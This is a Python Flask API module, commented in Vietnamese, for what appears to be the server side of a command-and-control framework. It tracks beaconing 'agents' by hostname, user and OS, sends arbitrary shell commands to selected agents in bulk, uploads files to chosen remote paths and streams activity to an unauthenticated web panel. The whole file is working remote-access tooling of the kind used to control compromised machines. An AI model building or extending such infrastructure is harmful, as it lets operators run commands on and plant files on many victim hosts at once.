# src/server/transport/api.py
#
# REST API Blueprint — gắn vào Flask app của HTTPTransport.
# Cung cấp các endpoint /api/* để frontend web tương tác với server.
#
# Routes:
#   GET  /api/clients              — danh sách agent đang kết nối
#   GET  /api/clients/selected     — danh sách agent đang được chọn
#   POST /api/clients/select       — chọn agent (body: {cids, add})
#   POST /api/clients/drop         — bỏ chọn agent (body: {cids} | {all})
#   POST /api/clients/remove       — disconnect + xoá agent (body: {cids} | {all})
#   POST /api/shell                — gửi shell command (body: {command})
#   POST /api/upload               — upload file tới agent (multipart: file + remote_path)
#   GET  /api/events               — SSE stream cho log realtime
#   GET  /                         — phục vụ index.html

import base64
import os
import queue
import threading
import time
from datetime import datetime
from pathlib import Path

from flask import Blueprint, Response, jsonify, request, send_from_directory

# ── SSE event queue (broadcast tới mọi connected client) ──────────────────────
_sse_subscribers: list[queue.Queue] = []
_sse_lock = threading.Lock()

_FRONTEND_DIR = Path(__file__).parent.parent / "frontend"


def _broadcast(event_type: str, data: dict):
    """Gửi SSE event tới mọi subscriber đang kết nối."""
    import json
    payload = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
    with _sse_lock:
        dead = []
        for q in _sse_subscribers:
            try:
                q.put_nowait(payload)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_subscribers.remove(q)


def broadcast_log(level: str, message: str):
    """Shortcut để gửi log event ra frontend."""
    _broadcast("log", {
        "level": level,
        "message": message,
        "ts": int(time.time() * 1000),
    })


def broadcast_client_update():
    """Thông báo danh sách agent đã thay đổi."""
    _broadcast("clients_update", {"ts": int(time.time() * 1000)})


# ── Helpers ───────────────────────────────────────────────────────────────────

def _format_beacon(last_beacon: datetime) -> str:
    elapsed = max(0, int((datetime.now() - last_beacon).total_seconds()))
    if elapsed < 60:
        return f"{elapsed}s ago"
    if elapsed < 3600:
        return f"{elapsed // 60}m ago"
    if elapsed < 86400:
        return f"{elapsed // 3600}h ago"
    return f"{elapsed // 86400}d ago"


def _client_to_dict(cid: str, info) -> dict:
    return {
        "uuid":        cid,
        "hostname":    info.hostname,
        "username":    info.username,
        "ip":          info.address[0],
        "port":        info.address[1],
        "os":          info.os,
        "arch":        info.arch,
        "last_beacon": _format_beacon(info.last_beacon),
    }


# ── Blueprint factory ─────────────────────────────────────────────────────────

def create_api_blueprint() -> Blueprint:
    """
    Tạo Flask Blueprint chứa toàn bộ REST API.
    Gọi hàm này sau khi Manager và ShellManager đã được import.
    """
    from core.client_manager import Manager
    from commands.interact.shell import ShellManager
    from commands.agent.agent_commands import Exit
    from commands.agent.file_upload import upload_handler
    from config import MessageType as messtype

    api = Blueprint("api", __name__)

    # ── Serve frontend ────────────────────────────────────────────────────────

    @api.route("/")
    def index():
        return send_from_directory(_FRONTEND_DIR, "index.html")

    # ── Clients ───────────────────────────────────────────────────────────────

    @api.route("/api/clients", methods=["GET"])
    def get_clients():
        clist = Manager.get_client_list()
        selected = ShellManager.get_current_client()
        data = []
        for cid, info in clist.items():
            d = _client_to_dict(cid, info)
            d["selected"] = cid in selected
            data.append(d)
        return jsonify({"clients": data, "total": len(data)})

    @api.route("/api/clients/selected", methods=["GET"])
    def get_selected():
        selected = list(ShellManager.get_current_client())
        return jsonify({"selected": selected})

    @api.route("/api/clients/select", methods=["POST"])
    def select_clients():
        body = request.get_json(force=True) or {}
        select_all = body.get("all", False)
        cids = body.get("cids", [])
        add = body.get("add", False)          # True = giữ selection cũ

        if not add:
            ShellManager.remove_all()

        if select_all:
            for cid in Manager.get_client_list():
                ShellManager.add(cid)
            broadcast_log("info", f"Selected all {Manager.count_client()} agent(s)")
            broadcast_client_update()
            return jsonify({"ok": True, "selected": list(ShellManager.get_current_client())})

        unknown = []
        for cid in cids:
            if Manager.check_valid_cid(cid):
                ShellManager.add(cid)
            else:
                unknown.append(cid)

        broadcast_log("info", f"Selected {len(cids) - len(unknown)} agent(s)")
        broadcast_client_update()
        return jsonify({
            "ok": True,
            "selected": list(ShellManager.get_current_client()),
            "unknown": unknown,
        })

    @api.route("/api/clients/drop", methods=["POST"])
    def drop_clients():
        body = request.get_json(force=True) or {}
        if body.get("all"):
            ShellManager.remove_all()
            broadcast_log("info", "Dropped all agents from selection")
        else:
            for cid in body.get("cids", []):
                ShellManager.remove(cid)
            broadcast_log("info", f"Dropped {len(body.get('cids', []))} agent(s) from selection")

        broadcast_client_update()
        return jsonify({"ok": True, "selected": list(ShellManager.get_current_client())})

    @api.route("/api/clients/remove", methods=["POST"])
    def remove_clients():
        body = request.get_json(force=True) or {}
        removed = []
        unknown = []

        if body.get("all"):
            targets = list(Manager.get_client_list().keys())
        else:
            targets = body.get("cids", [])

        for cid in targets:
            if Manager.check_valid_cid(cid):
                Exit.execute(cid)
                Manager.drop_client(cid)
                ShellManager.remove(cid)
                removed.append(cid)
            else:
                unknown.append(cid)

        broadcast_log("warn", f"Removed {len(removed)} agent(s) from server")
        broadcast_client_update()
        return jsonify({"ok": True, "removed": removed, "unknown": unknown})

    # ── Shell command ─────────────────────────────────────────────────────────

    @api.route("/api/shell", methods=["POST"])
    def shell_command():
        body = request.get_json(force=True) or {}
        command = (body.get("command") or "").strip()

        if not command:
            return jsonify({"ok": False, "error": "No command provided"}), 400

        selected = ShellManager.get_current_client()
        if not selected:
            return jsonify({"ok": False, "error": "No agents selected"}), 400

        sent = []
        missing = []

        for cid in list(selected):
            client = Manager.get_client(cid)
            if client is None:
                missing.append(cid)
                continue
            client.session.send_request(messtype.COMMAND, command)
            sent.append(cid)

        broadcast_log("cmd", f"$ {command}  →  {len(sent)} agent(s)")
        return jsonify({"ok": True, "sent": sent, "missing": missing})

    # ── File upload ───────────────────────────────────────────────────────────

    @api.route("/api/upload", methods=["POST"])
    def upload_file():
        remote_path = (request.form.get("remote_path") or "").strip()
        file_obj = request.files.get("file")

        if not file_obj or not remote_path:
            return jsonify({"ok": False, "error": "Missing file or remote_path"}), 400

        selected = ShellManager.get_current_client()
        if not selected:
            return jsonify({"ok": False, "error": "No agents selected"}), 400

        # Lưu tạm để reuse bytes
        raw = file_obj.read()
        file_size = len(raw)
        file_data_b64 = base64.b64encode(raw).decode("utf-8")

        sent = []
        missing = []

        for cid in list(selected):
            client = Manager.get_client(cid)
            if client is None:
                missing.append(cid)
                continue
            client.session.send_request(messtype.COMMAND, {
                "command":   "agent.upload",
                "file_path": remote_path,
                "file_data": file_data_b64,
                "file_size": file_size,
            })
            sent.append(cid)

        broadcast_log("info", f"Uploaded '{file_obj.filename}' ({file_size}B) → {remote_path}  [{len(sent)} agent(s)]")
        return jsonify({"ok": True, "sent": sent, "missing": missing,
                        "filename": file_obj.filename, "size": file_size})

    # ── SSE log stream ────────────────────────────────────────────────────────

    @api.route("/api/events", methods=["GET"])
    def sse_events():
        def stream():
            q: queue.Queue = queue.Queue(maxsize=200)
            with _sse_lock:
                _sse_subscribers.append(q)
            # Heartbeat ban đầu
            yield ": connected\n\n"
            try:
                while True:
                    try:
                        data = q.get(timeout=25)
                        yield data
                    except queue.Empty:
                        yield ": heartbeat\n\n"
            finally:
                with _sse_lock:
                    if q in _sse_subscribers:
                        _sse_subscribers.remove(q)

        return Response(
            stream(),
            mimetype="text/event-stream",
            headers={
                "Cache-Control":   "no-cache",
                "X-Accel-Buffering": "no",
            },
        )

    return api
